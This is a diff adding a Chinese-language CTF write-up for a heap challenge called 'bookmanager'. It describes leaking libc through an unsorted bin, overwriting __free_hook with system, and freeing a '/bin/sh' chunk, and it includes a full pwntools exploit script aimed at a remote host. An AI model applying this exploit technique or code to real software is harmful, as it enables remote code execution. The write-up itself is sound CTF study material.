@@ -91,6 +91,125 @@ icon: icon-html
     
     ```
 
+* ### bookmanager
+
+  堆地址白给，存在堆溢出
+
+  先搞一个unsorted bin，fd、bk为main_arena+88
+
+  然后堆溢出改另一个块指向text的指针，指向unsorted bin的fd，preview可以得到main_arena+88，泄露libc
+
+  指向text的指针指向free_hook然后update可以写free_hook
+
+  在text中写/bin/sh，把free_hook写成system然后free这个text
+
+  ```python
+  from pwn import *
+  context.log_level = 'debug'
+  r = remote('47.112.115.30',13337)
+  
+  def add_chapter(c_name):
+      r.recvuntil('choice:')
+      r.sendline('1')
+      r.recvuntil('name:')
+      r.sendline(c_name)
+  
+  def add_section(c_name,s_name):
+      r.recvuntil('choice:')
+      r.sendline('2')
+      r.recvuntil('add into:')
+      r.sendline(c_name)
+      r.recvuntil('0x')
+      leak_heap = u64(r.recvuntil('\n',drop=True),16)
+      r.recvuntil('name:')
+      r.sendline(s_name)
+      return leak_heap
+  
+  def add_text(s_name,text,text_size):
+      r.recvuntil('choice:')
+      r.sendline('3')
+      r.recvuntil('add into:')
+      r.sendline(s_name)
+      r.recvuntil('write:')
+      r.sendline(str(text_size))
+      r.recvuntil('Text:')
+      r.sendline(text)
+  
+  def remove_chapter(c_name):
+      r.recvuntil('choice:')
+      r.sendline('4')
+      r.recvuntil(' name:')
+      r.sendline(c_name)
+  
+  def remove_section(s_name):
+      r.recvuntil('choice:')
+      r.sendline('5')
+      r.recvuntil(' name:')
+      r.sendline(s_name)
+  
+  def remove_text(s_name):
+      r.recvuntil('choice:')
+      r.sendline('6')
+      r.recvuntil(' name:')
+      r.sendline(s_name)
+  
+  def book_preview():
+      r.recvuntil('choice:')
+      r.sendline('7')
+  
+  def update_text(s_name,text):
+      r.recvuntil('choice:')
+      r.sendline('8')
+      r.recvuntil('Text):')
+      r.sendline('Text')
+      r.recvuntil('name:')
+      r.sendline(s_name)
+      r.recvuntil('Text:')
+      r.send(text)
+  
+  r.recvuntil('create: ')
+  r.sendline('nmsl')
+  
+  add_chapter('a')
+  add_section('a','b1')
+  add_text('b1','c1',0x20)
+  
+  leak_heap = add_section('a','b2')
+  log.success(hex(leak_heap))
+  add_text('b2','c2',0x80)
+  add_section('a','b3')
+  remove_text('b2')
+  remove_section('b1')
+  add_section('a','b1')
+  payload = 'a'*80 + p64(leak_heap+0x40)
+  
+  add_text('b1',payload,0x20)
+  
+  book_preview()
+  r.recvuntil('Text:')
+  r.recvuntil('Text:')
+  main_arena_88 = u64(r.recv(6).ljust(8,'\x00'))
+  libc_base = main_arena_88 - 88 - 0x3c4b20
+  free_hook = libc_base + 0x3c67a8
+  system_addr = libc_base + 0x45390
+  log.success(hex(libc_base))
+  add_text('b3','c3',0x80)
+  
+  add_section('a','b4')
+  add_text('b4','c4',0x20)
+  add_section('a','b5')
+  add_text('b5','c5',0x20)
+  payload = '/bin/sh\x00' + p64(0)*4 + p64(0x41) + p64(0x003562) 
+  payload += p64(0)*3 + p64(free_hook) + p64(0x20)
+  update_text('b4',payload)
+  update_text('b5',p64(system_addr))
+  remove_text('b4')
+  
+  r.interactive()
+  ```
+
+  
+
 * ### 2019
 
   zsteg找到一串base64，解码得到一串base85，解码得到flag
